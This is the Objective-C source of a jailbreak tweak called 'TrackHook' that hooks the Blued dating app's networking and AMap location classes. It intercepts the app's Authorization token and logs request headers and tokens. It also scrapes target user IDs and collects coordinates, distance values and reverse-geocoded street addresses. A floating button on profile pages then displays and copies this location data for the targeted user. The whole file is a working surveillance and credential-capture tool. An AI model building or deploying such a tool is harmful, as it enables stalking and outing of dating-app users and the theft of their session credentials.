#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

#define TRACK_BTN_TAG 100001
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

static NSLock *g_dataLock = nil;
static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_currentLat = 0.0;
static double g_currentLng = 0.0;
static double g_targetDistance = -1.0;
static UIWindow *g_floatWindow = nil;
static NSString *g_amapAddress = nil; // 新增：高德地图地址信息

// ==================== 自定义窗口类 ====================
@interface TrackHookWindow : UIWindow
@end

@implementation TrackHookWindow
- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    UIView *hitView = [super hitTest:point withEvent:event];
    UIView *btnView = [self viewWithTag:TRACK_BTN_TAG];
    if (btnView && [btnView pointInside:[self convertPoint:point toView:btnView] withEvent:event]) {
        return hitView;
    }
    return nil;
}
@end
// ==================== 自定义窗口类结束 ====================

// ==================== 类别方法声明 ====================
// 在hook之前声明所有类别方法，解决编译器找不到方法的问题
@interface UIViewController (TrackHookMethods)
- (UIWindow *)th_getSafeKeyWindow;
- (void)th_onBtnClick;
- (NSString *)extractUserIdFromUI;
- (NSString *)searchViewHierarchy:(UIView *)view;
- (void)th_addBtn;
- (void)th_handlePan:(UIPanGestureRecognizer *)pan;
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur;
@end

@interface NSURLConnection (TrackHookMethods)
+ (void)processRequestData:(NSURLRequest *)request;
+ (BOOL)isTargetRequest:(NSString *)urlString host:(NSString *)host;
+ (void)extractDataFromURL:(NSString *)urlString;
+ (void)enhancedExtractDataFromURL:(NSString *)urlString; // 新增：增强参数提取
@end

@interface NSURLSession (TrackHookMethods)
- (void)processRequestData:(NSURLRequest *)request;
- (void)extractDistanceFromJSON:(NSDictionary *)json;
- (void)extractUserIdFromJSON:(NSDictionary *)json;
- (void)deepSearchDistanceInObject:(id)obj;
- (void)deepSearchUserIdInObject:(id)obj;
@end

// 新增：高德地图SDK相关声明
@interface AMapLocationManager : NSObject
- (void)requestLocationWithReGeocode:(BOOL)reGeocode completionBlock:(id)completionBlock;
@end

@interface AMapSearchAPI : NSObject
- (void)AMapReGoecodeSearch:(id)request;
@end

@interface AMapReGeocodeSearchRequest : NSObject
@property (nonatomic, assign) struct CLLocationCoordinate2D location;
@end

@interface AMapReGeocodeSearchResponse : NSObject
@property (nonatomic, strong) id regeocode;
@end

@interface AMapReGeocode : NSObject
@property (nonatomic, copy) NSString *formattedAddress;
@property (nonatomic, strong) id addressComponent;
@end

@interface AMapAddressComponent : NSObject
@property (nonatomic, copy) NSString *district;
@end
// ==================== 类别声明结束 ====================

%hook UIViewController

%new
- (UIWindow *)th_getSafeKeyWindow {
    UIWindow *foundWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *windowScene = (UIWindowScene *)scene;
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow) {
                        foundWindow = window;
                        break;
                    }
                }
            }
        }
    }
    return foundWindow ?: [[UIApplication sharedApplication] windows].firstObject;
}

%new
- (void)th_onBtnClick {
    NSLog(@"TrackHook: 🎯 悬浮按钮被点击");
    
    [g_dataLock lock];
    NSString *currentToken = [g_bluedBasicToken copy];
    NSString *currentUid = [g_currentTargetUid copy];
    double lat = g_currentLat;
    double lng = g_currentLng;
    double distance = g_targetDistance;
    NSString *amapAddr = [g_amapAddress copy];
    [g_dataLock unlock];
    
    NSLog(@"TrackHook: 📊 当前数据状态:");
    NSLog(@"TrackHook:   Token: %@", currentToken ? @"✅ 已获取" : @"❌ 无");
    NSLog(@"TrackHook:   用户ID: %@", currentUid ?: @"❌ 无");
    NSLog(@"TrackHook:   坐标: (%.6f, %.6f)", lat, lng);
    NSLog(@"TrackHook:   距离: %.2f km", distance);
    NSLog(@"TrackHook:   高德地址: %@", amapAddr ?: @"❌ 无");
    
    // 尝试从UI提取用户ID
    NSString *uid = [self extractUserIdFromUI];
    if (uid && uid.length > 0) {
        NSLog(@"TrackHook: ✅ 从UI提取到用户ID: %@", uid);
        [g_dataLock lock];
        g_currentTargetUid = [uid copy];
        [g_dataLock unlock];
    }
    
    [g_dataLock lock];
    NSString *targetUid = [g_currentTargetUid copy];
    NSString *basicToken = [g_bluedBasicToken copy];
    double myLat = g_currentLat;
    double myLng = g_currentLng;
    double myDistance = g_targetDistance;
    NSString *myAmapAddr = [g_amapAddress copy];
    [g_dataLock unlock];
    
    if (!targetUid) {
        [self th_showToast:@"缺少用户ID\n请点击右上角分享按钮" duration:3.0];
        return;
    }
    if (!basicToken) {
        [self th_showToast:@"缺少Token\n请刷新动态后重试" duration:3.0];
        return;
    }
    if (fabs(myLat) < 0.001 || fabs(myLng) < 0.001) {
        [self th_showToast:@"缺少坐标\n请先刷新用户动态" duration:3.0];
        return;
    }
    if (myDistance <= 0) {
        [self th_showToast:@"缺少距离信息" duration:2.0];
    }

    NSString *resStr = [NSString stringWithFormat:@"纬度: %.6f\n经度: %.6f\n距离: %.2f km\n用户ID: %@\n高德地址: %@", 
                       myLat, myLng, myDistance, targetUid, myAmapAddr ?: @"无"];
    UIAlertController *resAlert = [UIAlertController alertControllerWithTitle:@"定位信息" 
                                                                     message:resStr 
                                                              preferredStyle:UIAlertControllerStyleAlert];
    [resAlert addAction:[UIAlertAction actionWithTitle:@"复制坐标" 
                                                 style:UIAlertActionStyleDefault 
                                               handler:^(UIAlertAction *a){
        [[UIPasteboard generalPasteboard] setString:[NSString stringWithFormat:@"%.6f, %.6f", myLat, myLng]];
        [self th_showToast:@"坐标已复制" duration:1.0];
    }]];
    [resAlert addAction:[UIAlertAction actionWithTitle:@"复制地址" 
                                                 style:UIAlertActionStyleDefault 
                                               handler:^(UIAlertAction *a){
        if (myAmapAddr) {
            [[UIPasteboard generalPasteboard] setString:myAmapAddr];
            [self th_showToast:@"地址已复制" duration:1.0];
        } else {
            [self th_showToast:@"无地址信息" duration:1.0];
        }
    }]];
    [resAlert addAction:[UIAlertAction actionWithTitle:@"确定" 
                                                 style:UIAlertActionStyleCancel 
                                               handler:nil]];
    [self presentViewController:resAlert animated:YES completion:nil];
}

%new
- (NSString *)extractUserIdFromUI {
    NSLog(@"TrackHook: 🔍 开始提取用户ID");
    
    NSArray<UIWindow *> *windows = [UIApplication sharedApplication].windows;
    
    for (UIWindow *window in windows) {
        if (window.hidden || window.alpha <= 0) continue;
        
        NSString *foundUid = [self searchViewHierarchy:window];
        if (foundUid) {
            NSLog(@"TrackHook: ✅ 找到用户ID: %@", foundUid);
            return foundUid;
        }
    }
    
    NSLog(@"TrackHook: ❌ 未找到用户ID");
    return nil;
}

%new
- (NSString *)searchViewHierarchy:(UIView *)view {
    if (!view) return nil;
    
    if ([view isKindOfClass:[UILabel class]]) {
        UILabel *label = (UILabel *)view;
        NSString *text = label.text;
        if (text && text.length > 0) {
            NSArray *patterns = @[
                @"ID\\s*[:：]\\s*(\\d+)",
                @"用户ID\\s*[:：]\\s*(\\d+)",
                @"UID\\s*[:：]\\s*(\\d+)",
                @"\\b(\\d{6,10})\\b"
            ];
            
            for (NSString *pattern in patterns) {
                NSError *error = nil;
                NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:pattern 
                                                                                       options:NSRegularExpressionCaseInsensitive 
                                                                                         error:&error];
                if (!error) {
                    NSTextCheckingResult *match = [regex firstMatchInString:text 
                                                                    options:0 
                                                                      range:NSMakeRange(0, text.length)];
                    if (match) {
                        NSString *uid = [text substringWithRange:[match rangeAtIndex:1]];
                        if (uid.length >= 6 && uid.length <= 10) {
                            return uid;
                        }
                    }
                }
            }
        }
    }
    
    for (UIView *subview in view.subviews) {
        NSString *foundUid = [self searchViewHierarchy:subview];
        if (foundUid) {
            return foundUid;
        }
    }
    
    return nil;
}

%new
- (void)th_addBtn {
    NSLog(@"TrackHook: 🎨 准备添加悬浮按钮");
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindowScene *targetScene = nil;
        if (@available(iOS 13.0, *)) {
            for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                    targetScene = (UIWindowScene *)scene;
                    break;
                }
            }
        }
        
        if (!targetScene && @available(iOS 13.0, *)) {
            NSLog(@"TrackHook: ❌ 无法获取当前活跃的 WindowScene");
            return;
        }
        
        BOOL needCreateWindow = NO;
        if (@available(iOS 13.0, *)) {
            needCreateWindow = (!g_floatWindow || g_floatWindow.windowScene != targetScene);
        } else {
            needCreateWindow = (!g_floatWindow);
        }
        
        if (needCreateWindow) {
            CGRect screenBounds = [UIScreen mainScreen].bounds;
            g_floatWindow = [[TrackHookWindow alloc] initWithFrame:screenBounds];
            if (@available(iOS 13.0, *)) {
                g_floatWindow.windowScene = targetScene;
            }
            g_floatWindow.windowLevel = UIWindowLevelStatusBar + 10;
            g_floatWindow.backgroundColor = [UIColor clearColor];
            g_floatWindow.rootViewController = [UIViewController new];
            g_floatWindow.rootViewController.view.backgroundColor = [UIColor clearColor];
            g_floatWindow.userInteractionEnabled = YES;
            g_floatWindow.hidden = NO;
            NSLog(@"TrackHook: 🪟 已创建独立悬浮窗口");
        }
        
        UIButton *oldBtn = [g_floatWindow viewWithTag:TRACK_BTN_TAG];
        if (oldBtn) [oldBtn removeFromSuperview];
        
        UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
        btn.tag = TRACK_BTN_TAG;
        btn.frame = CGRectMake(g_floatWindow.bounds.size.width - 70, g_floatWindow.bounds.size.height / 2, 56, 56);
        btn.backgroundColor = [[UIColor systemBlueColor] colorWithAlphaComponent:0.85];
        [btn setTitle:@"🛰️" forState:UIControlStateNormal];
        [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        btn.titleLabel.font = [UIFont systemFontOfSize:24];
        btn.layer.cornerRadius = 28;
        btn.layer.borderWidth = 1.0;
        btn.layer.borderColor = [UIColor whiteColor].CGColor;
        btn.layer.shadowColor = [UIColor blackColor].CGColor;
        btn.layer.shadowOffset = CGSizeMake(0, 2);
        btn.layer.shadowOpacity = 0.3;
        btn.userInteractionEnabled = YES;
        
        [btn addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
        UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_handlePan:)];
        [btn addGestureRecognizer:pan];
        [g_floatWindow addSubview:btn];
        NSLog(@"TrackHook: ✅ 悬浮按钮已添加到独立窗口");
    });
}

%new
- (void)th_handlePan:(UIPanGestureRecognizer *)pan {
    UIView *v = pan.view;
    CGPoint translation = [pan translationInView:v.superview];
    v.center = CGPointMake(v.center.x + translation.x, v.center.y + translation.y);
    [pan setTranslation:CGPointZero inView:v.superview];
    CGFloat margin = 28;
    CGRect safeArea = v.superview.bounds;
    v.center = CGPointMake(MAX(margin, MIN(safeArea.size.width - margin, v.center.x)),
                           MAX(margin, MIN(safeArea.size.height - margin, v.center.y)));
}

%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (!g_floatWindow) {
            g_floatWindow = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
            g_floatWindow.windowLevel = UIWindowLevelStatusBar + 1;
            g_floatWindow.backgroundColor = [UIColor clearColor];
            g_floatWindow.userInteractionEnabled = YES;
            g_floatWindow.hidden = NO;
        }
        for (UIView *subview in g_floatWindow.subviews) {
            if ([subview isKindOfClass:[UILabel class]] && subview.tag == 9999) {
                [subview removeFromSuperview];
            }
        }
        UILabel *lab = [[UILabel alloc] init];
        lab.tag = 9999;
        lab.text = msg;
        lab.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
        lab.textAlignment = NSTextAlignmentCenter;
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
        lab.textColor = [UIColor whiteColor];
        lab.layer.cornerRadius = 10;
        lab.clipsToBounds = YES;
        lab.numberOfLines = 0;
        CGSize textSize = [lab sizeThatFits:CGSizeMake(g_floatWindow.bounds.size.width * 0.7, 100)];
        lab.bounds = CGRectMake(0, 0, textSize.width + 30, textSize.height + 20);
        lab.center = CGPointMake(g_floatWindow.bounds.size.width / 2, g_floatWindow.bounds.size.height * 0.85);
        [g_floatWindow addSubview:lab];
        lab.alpha = 0;
        [UIView animateWithDuration:0.3 animations:^{ lab.alpha = 1.0; }];
        [UIView animateWithDuration:0.3 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL finished) { 
            if (finished) [lab removeFromSuperview]; 
        }];
    });
}

- (void)viewDidAppear:(BOOL)animated {
    %orig(animated);
    NSString *clsName = NSStringFromClass([self class]);
    NSArray *targetKeywords = @[@"Detail", @"User", @"Profile", @"Homepage", @"Info", @"HomePage", @"PersonData", @"HomeView"];
    BOOL shouldInject = NO;
    for (NSString *keyword in targetKeywords) {
        if ([clsName containsString:keyword]) {
            shouldInject = YES;
            break;
        }
    }
    if (shouldInject) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self th_addBtn];
        });
    } else {
        if (g_floatWindow) {
            UIView *btn = [g_floatWindow viewWithTag:TRACK_BTN_TAG];
            if (btn) {
                [btn removeFromSuperview];
                NSLog(@"TrackHook: 📍 在非目标页面移除按钮");
            }
        }
    }
}
%end

%hook NSMutableURLRequest

- (void)setValue:(NSString *)value forHTTPHeaderField:(NSString *)field {
    NSLog(@"TrackHook: 🏷️ 设置HTTP头字段: %@ = %@...", field, 
          [value substringToIndex:MIN(30, value.length)]);
    
    if ([field isEqualToString:@"Authorization"] && [value hasPrefix:@"Basic "]) {
        NSString *token = [value substringFromIndex:6];
        if (token.length > 0) {
            [g_dataLock lock];
            g_bluedBasicToken = [token copy];
            [g_dataLock unlock];
            NSLog(@"TrackHook: ✅ 捕获到Basic Token (长度: %lu)", (unsigned long)token.length);
        }
    }
    
    %orig(value, field);
}

%end

%hook NSURLConnection

+ (NSData *)sendSynchronousRequest:(NSURLRequest *)request returningResponse:(NSURLResponse * _Nullable *)response error:(NSError * _Nullable *)error {
    NSLog(@"TrackHook: 🔄 同步请求: %@", request.URL.absoluteString);
    
    [self processRequestData:request];
    return %orig(request, response, error);
}

+ (void)sendAsynchronousRequest:(NSURLRequest *)request queue:(NSOperationQueue *)queue completionHandler:(void (^)(NSURLResponse *, NSData *, NSError *))handler {
    
    NSLog(@"TrackHook: 🔄 异步请求: %@", request.URL.absoluteString);
    
    [self processRequestData:request];
    
    %orig(request, queue, handler);
}

%new
+ (void)processRequestData:(NSURLRequest *)request {
    NSString *urlString = request.URL.absoluteString;
    NSString *host = request.URL.host;
    
    // 检查是否是目标请求
    BOOL shouldProcess = [self isTargetRequest:urlString host:host];
    
    if (shouldProcess) {
        NSLog(@"TrackHook: 📡 捕获NSURLConnection请求: %@", urlString);
        
        // 捕获Authorization
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if (auth && [auth hasPrefix:@"Basic "]) {
            NSString *token = [auth substringFromIndex:6];
            [g_dataLock lock];
            g_bluedBasicToken = [token copy];
            [g_dataLock unlock];
            NSLog(@"TrackHook: ✅ 从NSURLConnection捕获Token");
        }
        
        // 从URL参数提取用户ID
        [self enhancedExtractDataFromURL:urlString];
    }
}

%new
+ (BOOL)isTargetRequest:(NSString *)urlString host:(NSString *)host {
    if (!host && !urlString) return NO;
    
    // 扩展目标主机列表，包括高德地图
    NSArray *targetHosts = @[@"198.18.1.70", @"198.18.1.76", @"198.18.3.228", 
                            @"social.irisgw.cn", @"pay.irisgw.cn", @"blued.cn", @"irisgw.cn",
                            @"dualstack-restios.amap.com",  // 新增：高德地图
                            @"restapi.amap.com",            // 新增：高德其他API
                            @"restapi.amap.com",            // 新增：高德其他API
                            @"lbs.amap.com"];               // 新增：高德LBS服务
    
    for (NSString *targetHost in targetHosts) {
        if ([host containsString:targetHost]) {
            return YES;
        }
    }
    
    // 匹配URL特征
    NSArray *urlPatterns = @[@"target_uid=", @"latitude=", @"longitude=", @"/users/", @"/pay/", @"location=", @"regeocode"];
    for (NSString *pattern in urlPatterns) {
        if ([urlString containsString:pattern]) {
            return YES;
        }
    }
    
    return NO;
}

%new
+ (void)extractDataFromURL:(NSString *)urlString {
    if (!urlString) return;
    
    // 解析URL参数
    NSURLComponents *components = [NSURLComponents componentsWithString:urlString];
    for (NSURLQueryItem *item in components.queryItems) {
        // 提取用户ID
        if ([item.name isEqualToString:@"target_uid"] || 
            [item.name isEqualToString:@"uid"] || 
            [item.name isEqualToString:@"user_id"]) {
            NSString *uid = item.value;
            if (uid && uid.length >= 6 && uid.length <= 10) {
                [g_dataLock lock];
                g_currentTargetUid = [uid copy];
                [g_dataLock unlock];
                NSLog(@"TrackHook: 🔍 从URL参数捕获用户ID: %@", uid);
            }
        }
        // 提取坐标
        else if ([item.name isEqualToString:@"latitude"] || [item.name isEqualToString:@"lat"]) {
            double lat = [item.value doubleValue];
            if (fabs(lat) > 0.001) {
                [g_dataLock lock];
                g_currentLat = lat;
                [g_dataLock unlock];
                NSLog(@"TrackHook: 📍 纬度: %.6f", lat);
            }
        }
        else if ([item.name isEqualToString:@"longitude"] || [item.name isEqualToString:@"lon"] || 
                 [item.name isEqualToString:@"lng"]) {
            double lng = [item.value doubleValue];
            if (fabs(lng) > 0.001) {
                [g_dataLock lock];
                g_currentLng = lng;
                [g_dataLock unlock];
                NSLog(@"TrackHook: 📍 经度: %.6f", lng);
            }
        }
    }
}

%new
+ (void)enhancedExtractDataFromURL:(NSString *)urlString {
    if (!urlString) return;
    
    // 使用更全面的URL解析
    NSURLComponents *components = [NSURLComponents componentsWithString:urlString];
    
    // 提取所有参数，便于调试
    for (NSURLQueryItem *item in components.queryItems) {
        NSLog(@"TrackHook: 🔍 URL参数: %@ = %@", item.name, 
              item.value.length > 50 ? [[item.value substringToIndex:50] stringByAppendingString:@"..."] : item.value);
        
        // 特别注意加密参数
        if ([item.name isEqualToString:@"extra_info"]) {
            NSLog(@"TrackHook: 🔐 发现加密参数extra_info，长度: %lu", (unsigned long)item.value.length);
            // 可以考虑保存用于后续分析
        }
        
        // 设备信息参数
        if ([item.name isEqualToString:@"idfa"] || 
            [item.name isEqualToString:@"make"] || 
            [item.name isEqualToString:@"model"]) {
            NSLog(@"TrackHook: 📱 设备信息: %@ = %@", item.name, item.value);
        }
        
        // 时间戳参数
        if ([item.name isEqualToString:@"boot_mark"] || [item.name isEqualToString:@"update_mark"]) {
            NSLog(@"TrackHook: ⏱️ 时间戳参数: %@ = %@", item.name, item.value);
        }
    }
    
    // 原有逻辑继续执行
    [self extractDataFromURL:urlString];
}

%end

%hook NSURLSession

- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *res, NSError *err))completionHandler {
    
    // 处理请求
    [self processRequestData:request];
    
    void (^customCompletionHandler)(NSData *, NSURLResponse *, NSError *) = ^(NSData *data, NSURLResponse *response, NSError *error) {
        if (completionHandler) {
            completionHandler(data, response, error);
        }
        
        // 处理响应
        if (data && data.length > 0) {
            @try {
                NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                if (json) {
                    [self extractDistanceFromJSON:json];
                    [self extractUserIdFromJSON:json];
                }
            } @catch (NSException *exception) {
                NSLog(@"TrackHook: ❌ JSON解析异常: %@", exception);
            }
        }
    };
    
    return %orig(request, customCompletionHandler);
}

%new
- (void)processRequestData:(NSURLRequest *)request {
    NSString *urlString = request.URL.absoluteString;
    NSString *host = request.URL.host;
    
    BOOL shouldProcess = [NSURLConnection isTargetRequest:urlString host:host];
    
    if (shouldProcess) {
        NSLog(@"TrackHook: 📡 捕获NSURLSession请求: %@", urlString);
        NSLog(@"TrackHook: 📋 完整请求头: %@", request.allHTTPHeaderFields);
        
        // 如果是高德地图请求，特别处理
        if ([host containsString:@"amap.com"]) {
            NSLog(@"TrackHook: 🗺️ 高德地图API请求");
            // 可以提取高德地图的key、坐标等
        }
        
        // 捕获Authorization
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if (auth && [auth hasPrefix:@"Basic "]) {
            NSString *token = [auth substringFromIndex:6];
            [g_dataLock lock];
            g_bluedBasicToken = [token copy];
            [g_dataLock unlock];
            NSLog(@"TrackHook: ✅ 从NSURLSession捕获Token");
        }
        
        // 从URL参数提取数据
        [NSURLConnection enhancedExtractDataFromURL:urlString];
    }
}

%new
- (void)extractDistanceFromJSON:(NSDictionary *)json {
    [self deepSearchDistanceInObject:json];
}

%new
- (void)extractUserIdFromJSON:(NSDictionary *)json {
    [self deepSearchUserIdInObject:json];
}

%new
- (void)deepSearchDistanceInObject:(id)obj {
    if (!obj) return;
    
    if ([obj isKindOfClass:[NSDictionary class]]) {
        NSDictionary *dict = (NSDictionary *)obj;
        
        for (NSString *key in dict.allKeys) {
            if ([key.lowercaseString containsString:@"distance"] || 
                [key.lowercaseString containsString:@"dis"] ||
                [key.lowercaseString containsString:@"range"]) {
                id value = dict[key];
                if ([value isKindOfClass:[NSNumber class]]) {
                    double distance = [value doubleValue];
                    if (distance > 0) {
                        [g_dataLock lock];
                        g_targetDistance = distance;
                        [g_dataLock unlock];
                        NSLog(@"TrackHook: 📏 距离: %.2f km", distance);
                        return;
                    }
                } else if ([value isKindOfClass:[NSString class]]) {
                    NSString *strValue = (NSString *)value;
                    if ([strValue containsString:@"km"]) {
                        NSScanner *scanner = [NSScanner scannerWithString:strValue];
                        double distance = 0.0;
                        if ([scanner scanDouble:&distance] && distance > 0) {
                            [g_dataLock lock];
                            g_targetDistance = distance;
                            [g_dataLock unlock];
                            NSLog(@"TrackHook: 📏 从字符串提取距离: %.2f km", distance);
                            return;
                        }
                    }
                }
            }
        }
        
        for (id item in dict.allValues) {
            [self deepSearchDistanceInObject:item];
        }
    } else if ([obj isKindOfClass:[NSArray class]]) {
        for (id item in (NSArray *)obj) {
            [self deepSearchDistanceInObject:item];
        }
    }
}

%new
- (void)deepSearchUserIdInObject:(id)obj {
    if (!obj) return;
    
    if ([obj isKindOfClass:[NSDictionary class]]) {
        NSDictionary *dict = (NSDictionary *)obj;
        
        NSArray *uidKeys = @[@"uid", @"user_id", @"userId", @"union_uid", @"unionUid", @"id", @"userId"];
        for (NSString *key in uidKeys) {
            id value = dict[key];
            if (value) {
                NSString *uidStr = nil;
                if ([value isKindOfClass:[NSString class]]) {
                    uidStr = value;
                } else if ([value isKindOfClass:[NSNumber class]]) {
                    uidStr = [value stringValue];
                }
                if (uidStr && uidStr.length >= 6 && uidStr.length <= 10) {
                    [g_dataLock lock];
                    g_currentTargetUid = [uidStr copy];
                    [g_dataLock unlock];
                    NSLog(@"TrackHook: 🔍 从JSON提取用户ID: %@", uidStr);
                    return;
                }
            }
        }
        
        for (id item in dict.allValues) {
            [self deepSearchUserIdInObject:item];
        }
    } else if ([obj isKindOfClass:[NSArray class]]) {
        for (id item in (NSArray *)obj) {
            [self deepSearchUserIdInObject:item];
        }
    }
}

%end

// ==================== 新增：高德地图SDK Hook ====================
%hook AMapLocationManager

- (void)requestLocationWithReGeocode:(BOOL)reGeocode completionBlock:(id)completionBlock {
    NSLog(@"TrackHook: 🗺️ 高德地图定位请求，是否需要逆地理编码: %@", reGeocode ? @"是" : @"否");
    %orig(reGeocode, completionBlock);
}

%end

%hook AMapSearchAPI

- (void)AMapReGoecodeSearch:(id)request {
    if ([request isKindOfClass:objc_getClass("AMapReGeocodeSearchRequest")]) {
        AMapReGeocodeSearchRequest *req = (AMapReGeocodeSearchRequest *)request;
        NSLog(@"TrackHook: 🔄 高德逆地理编码请求: %.6f, %.6f", 
              req.location.latitude, req.location.longitude);
        
        // 保存高德地图的坐标
        [g_dataLock lock];
        g_currentLat = req.location.latitude;
        g_currentLng = req.location.longitude;
        NSLog(@"TrackHook: ✅ 从高德地图获取坐标: (%.6f, %.6f)", g_currentLat, g_currentLng);
        [g_dataLock unlock];
    }
    %orig(request);
}

%end

%hook AMapReGeocodeSearchResponse

- (void)setRegeocode:(id)regeocode {
    if ([regeocode isKindOfClass:objc_getClass("AMapReGeocode")]) {
        AMapReGeocode *geo = (AMapReGeocode *)regeocode;
        NSLog(@"TrackHook: 🏘️ 高德返回逆地理编码结果");
        NSLog(@"TrackHook: 📍 地址: %@", geo.formattedAddress);
        
        // 提取地区信息
        if ([geo.addressComponent isKindOfClass:objc_getClass("AMapAddressComponent")]) {
            AMapAddressComponent *addrComp = (AMapAddressComponent *)geo.addressComponent;
            NSLog(@"TrackHook: 🏘️ 地区: %@", addrComp.district);
        }
        
        // 保存地址信息
        [g_dataLock lock];
        g_amapAddress = [geo.formattedAddress copy];
        NSLog(@"TrackHook: ✅ 保存高德地址: %@", g_amapAddress);
        [g_dataLock unlock];
    }
    %orig(regeocode);
}

%end

// ==================== 初始化代码 ====================
%ctor {
    NSLog(@"TrackHook: 🚀 Hook初始化");
    g_dataLock = [[NSLock alloc] init];
    NSLog(@"TrackHook: ✅ 数据锁已初始化");
}
